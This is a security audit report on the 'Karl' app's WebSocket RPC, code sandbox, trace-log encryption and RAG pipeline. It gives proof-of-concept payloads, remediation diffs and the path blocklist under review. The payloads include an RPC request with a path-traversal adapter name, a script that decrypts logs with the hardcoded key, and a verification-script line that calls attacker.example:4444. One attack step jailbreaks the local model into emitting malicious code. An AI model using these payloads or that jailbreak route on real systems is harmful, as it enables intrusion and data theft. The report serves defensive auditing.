# Security & Data Integrity Audit Report — Agent 3
## Data Pipelines, Security, and Verification (RAG, Cryptography, & Sandbox)

**Scope:** `app/utils/rag_pipeline.py`, `app/utils/db_pool.py`, `app/utils/trace_logger.py`,
`app/utils/keychain_manager.py`, `app/utils/training_curator.py`, `app/utils/custom_embeddings.py`,
`data/flywheel/executor_sandbox.py`, `auto_train.py`, plus the WebSocket RPC surface
(`app/engine/websocket_server.py`) that these modules are reachable from.

**Note on scope deviation:** The brief's checklist assumes a bubblewrap (`bwrap`)-based sandbox.
No such implementation exists anywhere in the codebase — `bwrap` appears only in test files
(`tests/test_*.py`) as a helper that *detects whether the test runner itself* is inside a bwrap
jail (e.g. CI), not as containment for verifier code. The actual sandbox is
`SafePythonSandbox` in `data/flywheel/executor_sandbox.py`, audited below in its place.

---

## 1. Data Flow Map

```
┌─────────────────────┐
│  WebSocket RPC       │  wss://localhost  (self-signed TLS)
│  (any external UI/   │  Auth: bearer token in querystring, scoped
│   agent client)       │  RBAC: METHOD_SCOPES{} per-method gate
└──────────┬───────────┘
           │
           ├─ ingest_path (scope: write:kb) ──▶ _is_safe_path() ──▶ _collect_kb_files()
           │                                                          │
           │                                                          ▼
           │                                            RAGPipeline.ingest_files()
           │                                            ├─ extract_text() [pdf/docx/txt/py/csv]
           │                                            ├─ chunk_text() → embed (SentenceTransformer)
           │                                            └─ _add_chunks_to_index()
           │                                                 ├─ SQLiteConnectionPool → meta.db (WAL)
           │                                                 └─ FAISS index.faiss (atomic tmp+replace)
           │
           ├─ search_kb (scope: read:kb) ────▶ retrieve_with_metadata() [dense/sparse/hybrid RRF+CrossEncoder]
           │
           ├─ start_auto_train (⚠ NO SCOPE REQUIRED) ──▶ subprocess: auto_train.py --topic --adapter_name
           │                                                  │
           │                                                  ├─ generate_tasks_for_topic() [LLM writes
           │                                                  │   verification_script as raw Python string]
           │                                                  ├─ verify_solution() ──▶ SafePythonSandbox.run_code()
           │                                                  │        ├─ Docker path (isolated)  — used IF
           │                                                  │        │   `docker info` succeeds
           │                                                  │        └─ Local subprocess fallback (NOT
           │                                                  │            isolated) — used otherwise
           │                                                  ├─ train_adapter() → ADAPTERS_DIR/adapter_name/*
           │                                                  └─ convert_adapter_to_gguf() → *.gguf
           │
           └─ (all RPC auth) ──▶ keychain_manager.{save,load}_cached_token()
                                   ├─ Linux kernel keyring (keyutils / raw syscall)
                                   └─ data/bridge_token.json (plaintext, on-disk)

Trace logging (every generation) ──▶ TraceLogger.log_generation() ──▶ trace_*.jsonl
   on rotation ──▶ _archive_log() ──▶ Fernet(key) encrypt ──▶ *.jsonl.enc
                        key = PBKDF2-HMAC-SHA256(password=bridge_token, salt=hardware_uuid, 100k iters)
                        hardware_uuid ⟵ /etc/machine-id (world-readable) via core/hardware_scout.py
                        bridge_token  ⟵ data/bridge_token.json (world-readable, plaintext)
```

**Key observation driving severity throughout this report:** none of the RAG, sandbox, or crypto
code paths are purely local/offline conveniences — they are all reachable through the WebSocket
RPC surface, and the RBAC layer that's supposed to gate them has a hole (`start_auto_train`).
That hole is what elevates several sandbox/crypto weaknesses from "theoretical" to "remotely
triggerable by any authenticated low-privilege client."

---

## 2. Findings

### [SEC-AUTHZ-01] — `start_auto_train` RPC missing scope enforcement
**Severity:** Critical
**File:** `app/engine/websocket_server.py:122-130` (declaration), `:161` (registered as callable), `:1851-1914` (handler)
**Failure Mode:** Broken access control → unauthenticated-for-privilege remote code execution chain

**Details:**
`METHOD_SCOPES` explicitly documents its own contract: *"Methods absent from this dict are
accessible to any authenticated client."* Compare the entries:

```python
METHOD_SCOPES: dict[str, str] = {
    "get_runtime_status": "read:telemetry",
    "list_kb_sources":    "read:kb",
    "search_kb":          "read:kb",
    "ingest_path":        "write:kb",
    "submit_task":        "admin:execute",
    "submit_chat":        "admin:execute",
    "swarm_inject_guidance": "admin:execute",
}
```

`start_auto_train` is registered in `_RPC_METHODS` (line 161) and dispatched at line 1851, but is
**absent from `METHOD_SCOPES`**. It spawns a subprocess that generates and executes LLM-authored
Python (see SEC-SANDBOX-01) and writes files to disk under an attacker-controlled path (see
PATH-TRAVERSAL-01) — objectively more dangerous than `submit_task`/`submit_chat`, both of which
correctly require `admin:execute`. The refresh_token handler (line 1300-1332) goes out of its way
with an explicit comment to prevent scope escalation ("never the global admin bridge token...
would let any authenticated (even read-only) client hand itself full admin scope") — showing the
RBAC design is deliberate elsewhere, which makes this omission look like a genuine gap rather than
intentional.

**Proof of Concept:**
1. Obtain (or be issued) a connection scoped only to `read:telemetry` — e.g. via a legitimately
   distributed read-only monitoring token, or via `refresh_token` on any authenticated connection
   (which preserves whatever scope that connection already has).
2. Send:
   ```json
   {"jsonrpc":"2.0","id":1,"method":"start_auto_train",
    "params":{"token":"<read:telemetry token>","topic":"<attacker topic>",
              "adapter_name":"../../../../tmp/pwn"}}
   ```
3. `_validate_rpc_params` (line 866-870) only checks that `topic`/`adapter_name` are non-empty
   strings — no scope check runs because `METHOD_SCOPES.get("start_auto_train")` returns `None`.
4. Server spawns `auto_train.py` as a full OS subprocess under the Karl process's own privileges.

**Recommended Diff Remediation:**
```diff
     METHOD_SCOPES: dict[str, str] = {
         "get_runtime_status": "read:telemetry",
         "list_kb_sources":    "read:kb",
         "search_kb":          "read:kb",
         "ingest_path":        "write:kb",
         "submit_task":        "admin:execute",
         "submit_chat":        "admin:execute",
         "swarm_inject_guidance": "admin:execute",
+        "start_auto_train":   "admin:execute",
+        "start_mini_train":   "admin:execute",
+        "create_custom_agent": "admin:execute",
     }
```
Audit every entry in `_RPC_METHODS` against `METHOD_SCOPES` and require an explicit scope for
every mutating/execution method — invert the default from allow to deny.

---

### [SEC-SANDBOX-01] — Local subprocess fallback provides no real containment
**Severity:** Critical
**File:** `data/flywheel/executor_sandbox.py:85-126` (`_run_locally`), `:31-42` (`run_code` dispatcher)
**Failure Mode:** Sandbox escape / arbitrary code execution on host

**Details:**
`SafePythonSandbox.run_code()` only uses Docker isolation when `docker info` succeeds (line
17-29, 38-39). Whenever Docker is unavailable — unset up, daemon not running, no permissions, or
simply not installed (the common case on a bare dev/desktop install, which is exactly how Karl is
distributed) — it silently falls back to `_run_locally()`:

```python
def set_resource_limits():
    resource.setrlimit(resource.RLIMIT_AS, (mem_limit, mem_limit))
    resource.setrlimit(resource.RLIMIT_CPU, (cpu_limit, cpu_limit))
...
proc = subprocess.run(
    [sys.executable, temp_name],
    preexec_fn=set_resource_limits if os.name != 'nt' else None,
    capture_output=True, text=True, timeout=self.cpu_timeout_sec
)
```

This applies only `RLIMIT_AS` (address space) and `RLIMIT_CPU` (CPU seconds). There is:
- **No filesystem isolation** — the executed script has full read/write access to everything the
  Karl process user can touch: `data/bridge_token.json`, trace log archives, SSH keys, source
  code, other users' documents already ingested into the RAG index, etc.
- **No network isolation** — `--network none`/`--unshare-net` is a Docker-only guarantee; the
  local fallback lets the script `import socket` and exfiltrate freely.
- **No RLIMIT_NPROC / `--pids-limit`** — a fork bomb is not bounded.
- **No child-process containment on timeout** — `subprocess.run(timeout=...)` kills only the
  direct child; a script that daemonizes (`os.fork()` + parent exit, or `os.setsid()`) can outlive
  the timeout and continue running detached from the sandbox entirely.

The `code` executed here is not developer-authored: it is the `verification_script` **generated
by the LLM itself** in `auto_train.py::generate_tasks_for_topic()` from an attacker-influenced
`topic` string, concatenated directly with test harness code and run verbatim (see
`auto_train.py:181-199`). Any prompt-injection that gets the model to emit `import os;
os.system(...)`, `import socket`, or a `subprocess` call inside `verification_script` runs with
full host privileges the moment Docker isn't present — chained directly from SEC-AUTHZ-01, this is
remote code execution reachable by any authenticated WebSocket client.

**Proof of Concept:**
1. Attacker (any authenticated client, per SEC-AUTHZ-01) calls `start_auto_train` with a `topic`
   crafted to jailbreak the local model into emitting a `verification_script` containing
   `import os, socket; os.system("id > /tmp/pwned"); socket.socket().connect(("attacker.example", 4444))`.
2. Host has no Docker daemon running (true for a large fraction of desktop installs).
3. `_run_locally()` executes the script directly with the Karl app's own filesystem/network access.

**Recommended Diff Remediation:**
Do not treat the local fallback as safe to run untrusted/LLM-generated code at all. Either:
1. Refuse to execute LLM-authored verification code when Docker is unavailable (fail closed), or
2. Implement real OS-level containment for the fallback path using `bwrap` per the original design
   intent:
```diff
 def _run_locally(self, script: str) -> tuple[bool, str]:
+    if not shutil.which("bwrap"):
+        return False, "SANDBOX UNAVAILABLE: neither Docker nor bubblewrap present. Refusing to execute untrusted code."
+    cmd = [
+        "bwrap", "--ro-bind", "/usr", "/usr", "--ro-bind", "/lib", "/lib",
+        "--ro-bind", "/lib64", "/lib64", "--tmpfs", "/tmp",
+        "--unshare-net", "--unshare-pid", "--die-with-parent",
+        "--new-session", "--proc", "/proc", "--dev", "/dev",
+        sys.executable, temp_name,
+    ]
     proc = subprocess.run(
-        [sys.executable, temp_name],
+        cmd,
         preexec_fn=set_resource_limits if os.name != 'nt' else None,
         capture_output=True, text=True, timeout=self.cpu_timeout_sec
     )
```

---

### [SEC-SANDBOX-02] — No privilege check in the `auto_train.py` entrypoint
**Severity:** High
**File:** `auto_train.py` (entire file — no such check exists), compare `main.py::_assert_not_privileged`
**Failure Mode:** Sandbox escape via root — rlimits become non-binding

**Details:**
`main.py` has a `_assert_not_privileged()` guard (exercised by
`tests/test_security_sandbox.py:24-35`) that refuses to start when `os.geteuid() == 0`. However,
`auto_train.py` is a **separate entrypoint**, invoked directly as
`subprocess.Popen([sys.executable, "auto_train.py", ...])` from
`app/engine/websocket_server.py:1872-1890` — it never imports or calls that guard. If Karl (or
just this subprocess) ever runs as root — a common misconfiguration for services/containers — the
`RLIMIT_AS`/`RLIMIT_CPU` caps set in `executor_sandbox.py::set_resource_limits()` are **not
binding on root**: a privileged process can call `resource.setrlimit()` again inside the
"sandboxed" script to raise its own limits back to `RLIM_INFINITY`, because raising a hard limit
requires `CAP_SYS_RESOURCE`, which root has. Combined with SEC-SANDBOX-01's total lack of
filesystem/network isolation in the local fallback, root execution removes the only enforcement
that existed.

**Proof of Concept:**
1. Deploy Karl as a systemd service / Docker container running as root (undocumented but not
   prevented — `auto_train.py` has no check).
2. Trigger `start_auto_train` per SEC-AUTHZ-01/SEC-SANDBOX-01.
3. Malicious `verification_script` calls
   `resource.setrlimit(resource.RLIMIT_AS, (resource.RLIM_INFINITY, resource.RLIM_INFINITY))`
   before doing anything memory-intensive, defeating the only limit set on it.

**Recommended Diff Remediation:**
```diff
+from core.security import assert_not_privileged  # extract shared helper from main.py
+
 def main():
+    assert_not_privileged()
     parser = argparse.ArgumentParser(...)
```
Extract `_assert_not_privileged` out of `main.py` into a shared module and call it at the top of
every independently-spawned entrypoint (`auto_train.py`, and any other `subprocess.Popen([sys.executable, "<script>.py", ...])` call sites).

---

### [PATH-TRAVERSAL-01] — Unsanitized `adapter_name` enables writes outside `data/adapters/`
**Severity:** High
**File:** `auto_train.py:293-294` (`train_adapter`), `:338-349` (`convert_adapter_to_gguf`); trigger: `app/engine/websocket_server.py:1853,1877` and `:866-870`
**Failure Mode:** Path traversal → arbitrary file write

**Details:**
```python
adapter_path = ADAPTERS_DIR / adapter_name          # auto_train.py:293
adapter_path.mkdir(parents=True, exist_ok=True)      # auto_train.py:294
...
outfile = adapter_path / f"{adapter_name}.gguf"      # auto_train.py:341
```
`adapter_name` comes straight from the WebSocket `start_auto_train` params. `_validate_rpc_params`
(`websocket_server.py:866-870`) only checks it's a non-empty string — no character allowlist. Note
the PyQt desktop UI *does* sanitize client-side (`app/ui/workspaces/training_studio/auto_train_tab.py:176`:
`re.sub(r'[^a-zA-Z0-9_\-]', '_', adapter_name)`), which confirms the developers know this needs
sanitizing — but that sanitization only happens in the UI widget, not on the server, so it is
trivially bypassed by any client that isn't the bundled desktop app (which is the entire point of
having a WebSocket RPC bridge).

**Proof of Concept:**
```json
{"jsonrpc":"2.0","id":1,"method":"start_auto_train",
 "params":{"token":"<any authenticated token — see SEC-AUTHZ-01>",
           "topic":"anything",
           "adapter_name":"../../../../../../tmp/evil"}}
```
`pathlib.Path("data/adapters") / "../../../../../../tmp/evil"` resolves outside the adapters
directory; `mkdir(parents=True)` creates it, and trained model weights / GGUF output land there.

**Recommended Diff Remediation:**
```diff
+ADAPTER_NAME_RE = re.compile(r'^[A-Za-z0-9_\-]{1,64}$')
+
 elif method == "start_auto_train":
     topic = params.get("topic")
     adapter_name = params.get("adapter_name")
+    if not ADAPTER_NAME_RE.match(adapter_name or ""):
+        await self._send_rpc_error(websocket, -32602, req_id,
+            message="adapter_name must match ^[A-Za-z0-9_-]{1,64}$")
+        continue
```
Apply the identical check inside `auto_train.py::main()` itself (defense in depth — the CLI is a
directly reachable entrypoint too), not only at the RPC boundary.

---

### [SEC-CRYPTO-01] — Silent fallback to a hardcoded encryption key
**Severity:** Critical
**File:** `app/utils/trace_logger.py:93-120`
**Failure Mode:** Cryptographic leak — encrypted archives become trivially decryptable

**Details:**
```python
def _get_encryption_key(self) -> bytes:
    try:
        token = "karl-default-secret"
        ...
        from core.hardware_scout import get_hardware_profile
        profile = get_hardware_profile()
        hardware_uuid = profile.get("hardware_uuid", "karl-locked-host-salt")
        k = hashlib.pbkdf2_hmac('sha256', token.encode(), hardware_uuid.encode(), 100000)
        return base64.urlsafe_b64encode(k)
    except Exception as e:
        logger.error(f"Failed to derive encryption key: {e}")
        return base64.urlsafe_b64encode(b"karl-emergency-fallback-key-32b!")
```
The `except Exception` clause is unconditional and catches *everything* — a missing
`core.hardware_scout` import, a transient `get_hardware_profile()` failure, a corrupt
`bridge_token.json`, a `PermissionError` on `/sys/class/dmi/id/product_uuid` — and on any of them
silently swaps in a **hardcoded, publicly-known 32-byte key** baked into the source tree. This is
logged only at `logger.error` (easy to miss, no user-facing alert, no refusal to archive), and the
archival proceeds as if nothing happened — the operator has no signal that their "encrypted" trace
logs are protected by a key anyone with the source code can compute.

**Proof of Concept:**
1. Run in an environment where `core.hardware_scout` raises (e.g., a container without
   `/sys/class/dmi/id/product_uuid`, `/etc/machine-id`, and no `uuid.getnode()`/`platform.processor()`
   support — plausible in minimal containers) — or simpler, run before `core.hardware_scout` is
   importable due to a packaging issue.
2. `_get_encryption_key()` returns `base64.urlsafe_b64encode(b"karl-emergency-fallback-key-32b!")`.
3. Any archived trace log (`data/logs/archive/*.jsonl.enc`) — which can contain full conversation
   history, RAG context, corrected responses — is decryptable by anyone running:
   ```python
   from cryptography.fernet import Fernet
   import base64
   key = base64.urlsafe_b64encode(b"karl-emergency-fallback-key-32b!")
   print(Fernet(key).decrypt(open("trace_....jsonl.enc","rb").read()))
   ```

**Recommended Diff Remediation:**
```diff
-        except Exception as e:
-            logger.error(f"Failed to derive encryption key: {e}")
-            return base64.urlsafe_b64encode(b"karl-emergency-fallback-key-32b!")
+        except Exception as e:
+            logger.critical(f"Failed to derive encryption key: {e}")
+            raise RuntimeError(
+                "Cannot derive a secure encryption key — refusing to archive logs "
+                "with a static fallback key. Fix hardware/token detection instead."
+            ) from e
```
`_archive_log`'s `except Exception` (line 246-247) already falls back to plaintext gzip on
`ImportError` — a raised `RuntimeError` here will be caught there and should itself be surfaced to
the operator, not silently degraded to plaintext either. Add an explicit "archival degraded to
plaintext/unencrypted" warning surfaced through the app UI, not just a log line.

---

### [SEC-CRYPTO-02] — Key derivation salt and default password are not secret
**Severity:** High
**File:** `app/utils/trace_logger.py:96-117`, `core/hardware_scout.py:41-74` (`get_hardware_uuid`)
**Failure Mode:** Predictable/derivable cryptographic key

**Details:**
The Fernet key is `PBKDF2(password=bridge_token, salt=hardware_uuid, 100_000, sha256)`. Both
inputs are weak:
- `hardware_uuid` (used as the *salt*, which normal cryptographic practice treats as
  non-secret-but-unique — fine in principle) is sourced by `get_hardware_uuid()` preferentially
  from **`/etc/machine-id`**, which is world-readable (`-rw-r--r--` by default on virtually every
  Linux distro) — any local, unprivileged user can read it directly.
- `token` defaults to the **hardcoded literal `"karl-default-secret"`** (`trace_logger.py:97`)
  whenever `data/bridge_token.json` doesn't exist yet — i.e. on any fresh install before the first
  bridge pairing, which is exactly the window during which early trace logs get created and
  potentially rotated/archived.
- With both inputs either world-readable or hardcoded, the derived key is **fully computable by
  anyone with local shell access to the machine**, defeating the purpose of encrypting trace
  archives (the audit brief's own threat model — protecting conversation data at rest) even
  without triggering SEC-CRYPTO-01's exception path.
- PBKDF2 iteration count (100,000) is below current OWASP guidance for PBKDF2-HMAC-SHA256
  (600,000+ as of the 2023 revision) — a secondary, lower-severity hardening gap.

**Proof of Concept:**
```bash
$ cat /etc/machine-id          # world-readable, no privilege needed
b1946ac92492d2347c6235b4d2611184
$ python3 -c "
import hashlib, base64
from cryptography.fernet import Fernet
k = hashlib.pbkdf2_hmac('sha256', b'karl-default-secret', b'b1946ac92492d2347c6235b4d2611184', 100000)
key = base64.urlsafe_b64encode(k)
print(Fernet(key).decrypt(open('data/logs/archive/trace_....jsonl.enc','rb').read()))
"
```

**Recommended Diff Remediation:**
- Never derive the encryption *password* from a value with a hardcoded fallback; generate a
  high-entropy random secret on first run and store it exclusively in the OS keychain / kernel
  keyring (the machinery in `keychain_manager.py` already exists — use it here instead of
  `bridge_token.json`).
- Raise PBKDF2 iterations to ≥600,000, or migrate to `Scrypt`/`Argon2id` (already a transitive
  dependency of `cryptography`).
- Treat `/etc/machine-id` purely as a *salt* (uniqueness), never as a stand-in for secrecy — this
  usage is fine for the salt role, but only if the password side is actually secret.

---

### [SEC-CRYPTO-03] — Bridge token file created with world-readable permissions
**Severity:** High
**File:** `app/utils/keychain_manager.py:192-217` (`add_scoped_token`), `app/engine/websocket_server.py:260-275` (`_persist_token_store`)
**Failure Mode:** Local privilege escalation / credential disclosure

**Details:**
```python
with open(token_path, "w", encoding="utf-8") as f:
    json.dump(data, f, indent=2)
```
Neither write path sets restrictive permissions. Verified on the live repo:
```
$ ls -la data/bridge_token.json
-rw-r--r-- 1 ethan ethan 232 Jul 15 19:40 data/bridge_token.json
```
This file holds the **admin-scoped bridge token** (`_rotate_token()` always mints an
`admin:execute`-scoped token as `self.bridge_token`, `websocket_server.py:244-258`) in plaintext,
world-readable. Any other local user on a shared/multi-user system can read it and connect to the
WebSocket RPC server with full admin scope — bypassing every RBAC check audited above, including
SEC-AUTHZ-01 (moot once you simply have the admin token). It is also the same `token` value used
as the PBKDF2 password in SEC-CRYPTO-02, so leaking this file leaks the trace-log encryption
capability too.

**Proof of Concept:**
```bash
$ id
uid=1001(otheruser) gid=1001(otheruser)   # different local user, same machine
$ cat /home/ethan/karl/data/bridge_token.json   # world-readable
{"token": "...", "tokens": {"...": ["read:telemetry","read:kb","write:kb","admin:execute"]}, ...}
$ # connect to wss://localhost:<port>/?token=<stolen token> — full admin access
```

**Recommended Diff Remediation:**
```diff
+import os as _os
 def add_scoped_token(token: str, scopes: list[str], token_path: str = TOKEN_PATH) -> None:
     ...
     with open(token_path, "w", encoding="utf-8") as f:
         json.dump(data, f, indent=2)
+    os.chmod(token_path, 0o600)
```
Apply the same `os.chmod(token_path, 0o600)` immediately after every write in
`websocket_server.py::_persist_token_store` as well. Consider opening with `os.open(path,
os.O_WRONLY|os.O_CREAT|os.O_TRUNC, 0o600)` to avoid a TOCTOU window where the file briefly exists
with default umask permissions before the `chmod` call lands.

---

### [SEC-RAG-01] — `_is_safe_path` blocklist has structural gaps
**Severity:** Medium
**File:** `app/engine/websocket_server.py:308-325`
**Failure Mode:** Incomplete path-traversal protection (blocklist bypass)

**Details:**
```python
def _is_safe_path(self, path: str) -> bool:
    ...
    for blocked in self.blocked_paths:
        real_blocked = os.path.realpath(blocked)
        if real_path == real_blocked or real_path.startswith(real_blocked + os.sep):
            ...
    return True
```
Two issues:
1. **`"/"` entry is a no-op.** `real_blocked = "/"`, so the `startswith` check becomes
   `real_path.startswith("/" + "/")` i.e. `"//"` — no realistic absolute path starts with a doubled
   separator, so this branch of `blocked_paths` (`websocket_server.py:232`) never actually fires
   except for the literal string `"/"` itself. The apparent intent (block everything, then carve
   out the project root) does not work as written.
2. **The blocklist is a small fixed enumeration** (`/, /etc, /bin, /sbin, /usr/bin, /usr/sbin,
   /var, /boot, /dev, /proc, /sys, /root` + the user's home/Desktop/Documents/Downloads). It misses
   `/opt`, `/srv`, `/media`, `/mnt`, `/lib`, `/lib64`, other mounted volumes, and — notably — **any
   other local user's home directory** (`/home/otheruser`), which is not blocked at all. A
   blocklist approach is inherently incomplete; this is a defense-in-depth gap, not a full bypass,
   since `ingest_path` also requires `write:kb` scope.

**Proof of Concept:**
With a valid `write:kb`-scoped token:
```json
{"jsonrpc":"2.0","id":1,"method":"ingest_path",
 "params":{"token":"...", "path":"/home/otheruser/Documents/secret_notes.txt"}}
```
`_is_safe_path` allows it (not in `blocked_paths`); `.txt` is a supported extension, so the file's
full contents are ingested into the RAG index and become retrievable via `search_kb`.

**Recommended Diff Remediation:**
Switch from blocklist to allowlist — only permit ingestion under an explicitly configured set of
workspace roots (this mirrors the pattern already used correctly by
`app/engine/swarm_agents.py::_safe_workspace_path`, which the test suite
(`tests/test_security_sandbox.py:46-88`) shows resolves symlinks and rejects `..`/absolute
injection properly). At minimum fix the `"/"` no-op and add the missing directories.

---

### [SEC-KEYRING-01] — Inconsistent ctypes hardening across libkeyutils call sites
**Severity:** Medium
**File:** `app/utils/keychain_manager.py:66-95` (`save_cached_token`), `:98-143` (`load_cached_token`), `:146-162` (`revoke_tokens`) vs. `:239-360` (`_add_key_kernel`, `_keyctl_timeout`, `_keyctl_revoke_key`)
**Failure Mode:** ctypes ABI mismatch / undefined behavior on 64-bit platforms

**Details:**
The file contains two generations of the same libkeyutils calls. The newer, clearly more careful
set explicitly documents the risk:
```python
# All argtypes and restype are declared before invocation to prevent pointer
# misalignment on 64-bit platforms.
fn.argtypes = [ctypes.c_char_p, ctypes.c_char_p, ctypes.c_char_p, ctypes.c_size_t, ctypes.c_int32]
fn.restype = ctypes.c_int32
```
But the original `save_cached_token` (line 73-79), `load_cached_token` (line 108-124), and
`revoke_tokens` (line 151-159) call `_libkeyutils.add_key(...)`, `.request_key(...)`,
`.keyctl_read(...)`, `.keyctl_revoke(...)` **without ever setting `argtypes`/`restype`**, letting
ctypes guess argument marshalling from the Python object types. `add_key(2)`'s real signature is
`key_serial_t add_key(const char *type, const char *description, const void *payload, size_t
plen, key_serial_t ringid)` — passing a bare Python `int` for `plen` (which ctypes defaults to
`c_int`, not `c_size_t`) is fragile: it happens to work on little-endian x86-64 for small values
because the upper 32 bits of the register end up zeroed, but this is undefined behavior the
codebase's own later comment identifies as a real risk, not a hypothetical one.

**Proof of Concept:**
Not independently exploitable by an external attacker (no attacker-controlled input reaches these
calls), but represents inconsistent hardening: a future change to `token` length handling, a
different libc/ABI (e.g. a 32-bit build, musl, or an unusual calling convention), or a compiler
mismatch could silently corrupt the stack or misinterpret the return value where the "hardened"
helpers below it in the same file would not.

**Recommended Diff Remediation:**
Replace `save_cached_token`/`load_cached_token`/`revoke_tokens`'s inline libkeyutils calls with
calls to the existing hardened helpers (`_add_key_kernel`, a symmetrical `_read_key_kernel`, and
`_keyctl_revoke_key`) instead of duplicating unguarded ctypes calls — the file already contains
the correct pattern, it's just not used consistently.

---

### [DB-LOCK-01] — Pool returns connections without verifying transaction state on error
**Severity:** Medium
**File:** `app/utils/db_pool.py:46-60` (`get_connection`)
**Failure Mode:** Database deadlock / connection pool poisoning

**Details:**
```python
@contextmanager
def get_connection(self):
    self._semaphore.acquire()
    conn = self._queue.get_nowait()
    try:
        yield conn
    finally:
        self._queue.put(conn)
        self._semaphore.release()
```
Every caller in `rag_pipeline.py` (`_add_chunks_to_index`, `remove_source`, `clear_index`) wraps
its `BEGIN IMMEDIATE ... commit()` in `try/except: conn.rollback(); ...; raise`, which is the
correct pattern — *provided `conn.rollback()` itself never raises*. If it does (e.g. the disk
holding the WAL file fills up, or the file is deleted/moved out from under the connection during a
concurrent `clear_index()`), the exception propagates out of the caller's `except` block, past this
context manager's `finally`, and the connection — now sitting mid-transaction — is returned to
`self._queue` anyway. The next caller to borrow it will get `sqlite3.OperationalError: cannot
start a transaction within a transaction` on its own subsequent `BEGIN IMMEDIATE`, and every
consumer after that inherits the same broken connection until the pool is exhausted or the process
restarts.

**Proof of Concept:**
1. Fill the disk (or otherwise force a write failure) during `_add_chunks_to_index`'s `BEGIN
   IMMEDIATE` + `executemany`.
2. The `except Exception: conn.rollback()` at `rag_pipeline.py:487-493` itself raises
   `sqlite3.OperationalError: disk I/O error` because the same disk-full condition blocks the
   rollback's WAL truncation.
3. `get_connection()`'s `finally` still runs, returning the poisoned, half-transacted connection to
   the pool.
4. Every subsequent RAG ingest/removal call that draws this connection fails immediately with
   "cannot start a transaction within a transaction" — a self-inflicted denial of service that
   persists until process restart.

**Recommended Diff Remediation:**
```diff
     @contextmanager
     def get_connection(self):
         self._semaphore.acquire()
         conn = self._queue.get_nowait()
+        broken = False
         try:
             yield conn
+        except Exception:
+            try:
+                conn.rollback()
+            except sqlite3.Error:
+                broken = True
+            raise
         finally:
-            self._queue.put(conn)
+            if broken:
+                conn.close()
+                conn = self._make_connection()
+            self._queue.put(conn)
             self._semaphore.release()
```

---

### [RAG-CONCURRENCY-01] — Write lock held across blocking FAISS disk I/O
**Severity:** Low
**File:** `app/utils/rag_pipeline.py:450-494` (`_add_chunks_to_index`), `:1051-1087` (`remove_source`)
**Failure Mode:** Lock contention / throughput DoS under concurrent multi-client usage

**Details:**
`self._write_lock` (a plain `threading.Lock`, non-reentrant, process-wide) is acquired for the
*entire* duration of `_add_chunks_to_index` and `remove_source`, including
`self._write_index_atomic()` — a full serialization of the FAISS index to a temp file followed by
`os.replace()`. For a large index this is a non-trivial blocking disk write. Because it's a single
global lock (not sharded per-namespace, despite `RAGPipeline` supporting a `namespace` parameter
for separate "user" vs "codex" indices — `rag_pipeline.py:72-78`), every RAG mutation across every
namespace/client serializes behind whichever write is currently flushing to disk. This is a
performance/availability concern under concurrent multi-client WebSocket usage rather than a
confidentiality/integrity bug.

**Recommended Diff Remediation:** Scope `_write_lock` per `RAGPipeline` instance (already true) but
ensure only one instance is shared across namespaces if that's not already the case, and consider
writing the FAISS index to a background thread with a short-held lock only for the pointer swap,
rather than holding the lock across the `faiss.write_index()` call itself.

---

### [SEC-CRYPTO-04] — Incomplete key-material scrubbing (Python immutable-bytes limitation)
**Severity:** Low (informational — inherent language limitation, but the code's own comments
overclaim the guarantee)
**File:** `app/utils/trace_logger.py:93-120`, `:122-126` (`_zero_bytes`)
**Failure Mode:** Residual plaintext key/token material in process heap

**Details:**
`_archive_log` correctly zeroes the *final* `bytearray` copy of the key (`key_ba`) inside a
`finally` block (`trace_logger.py:224-230`). However, `_get_encryption_key()` itself produces
several **immutable** `bytes` objects along the way — `token.encode()`, `hardware_uuid.encode()`,
the raw PBKDF2 digest `k`, and `base64.urlsafe_b64encode(k)` — none of which can be zeroed in
CPython; they become garbage and their backing memory is only overwritten whenever the allocator
happens to reuse that heap slot. The `mlockall(MCL_CURRENT | MCL_FUTURE)` call in
`_secure_mem_lock()` prevents those pages from being *swapped to disk* while locked, but does not
erase them, and the module-level docstring/checklist language ("cryptographic memory sanitization")
somewhat overstates what's actually guaranteed. This is a known hard limitation of pure-Python
key handling, not a bug introduced by this code, but worth documenting so it isn't relied upon as
a stronger guarantee than it is.

**Recommended Diff Remediation:** For genuine best-effort scrubbing, do the PBKDF2 derivation
directly into a pre-allocated mutable buffer (e.g. via `hashlib.pbkdf2_hmac` into a `ctypes` buffer
is not directly supported — consider `cryptography.hazmat.primitives.kdf.pbkdf2` writing into a
`bytearray`via `derive()` semantics are similar, so this is mostly unavoidable in pure Python) or
accept and document the limitation explicitly rather than implying full sanitization.

---

### [SEC-SANDBOX-04] — Docker path missing defense-in-depth flags
**Severity:** Low
**File:** `data/flywheel/executor_sandbox.py:44-83` (`_run_in_docker`)
**Failure Mode:** Reduced containment even in the "good" (Docker) path

**Details:**
The Docker invocation correctly sets `--network none`, `--memory`, `--cpu-shares`, `--user
1000:1000`, and `--rm`. It's missing several standard hardening flags that cost nothing to add:
`--pids-limit` (fork-bomb protection inside the container), `--read-only` (root filesystem),
`--security-opt=no-new-privileges`, and `--cap-drop=ALL`. None of these are exploitable escapes on
their own, but their absence means a compromised container has more room to misbehave (spawn many
processes, write to its own writable layer) than necessary for a task that only needs to run a
Python script and report stdout/stderr.

**Recommended Diff Remediation:**
```diff
 cmd = [
     "docker", "run", "--rm", "-i",
     "--network", "none",
     f"--memory={self.memory_limit_mb}m",
     "--cpu-shares=256",
+    "--pids-limit=64",
+    "--read-only",
+    "--security-opt=no-new-privileges",
+    "--cap-drop=ALL",
     "--user", "1000:1000",
     self.image,
     "python3"
 ]
```

---

## 3. Areas Audited With No Findings

- **SQL injection:** `rag_pipeline.py` and `db_pool.py` use parameterized queries (`?`
  placeholders) exclusively throughout — no string-formatted SQL anywhere in scope.
- **Subprocess shell injection:** every `subprocess.run`/`Popen` call in scope (executor_sandbox.py,
  auto_train.py, websocket_server.py's `start_auto_train`/SSL-cert generation) passes a list of
  args with no `shell=True`, and untrusted content (the verifier script) is piped via `stdin`
  rather than interpolated into argv — no shell metacharacter injection vector found.
- **Grading harness (`eval/graders.py`):** all five graders are pure string/regex/JSON functions
  with no `exec`/`eval`/subprocess calls and no unbounded-backtracking regex patterns — safe by
  construction. Note: this module does **not** contain a code-execution or "unit test" grader
  despite the audit brief's checklist implying one; the actual code-execution verification path is
  entirely `auto_train.py` → `SafePythonSandbox`, audited above.
- **FAISS empty-query handling:** `retrieve_with_metadata` explicitly short-circuits on
  `self.index.ntotal == 0` (`rag_pipeline.py:845-846`), and `retrieve_sparse` handles a
  zero-norm query vector (`:721-722`) without division errors.
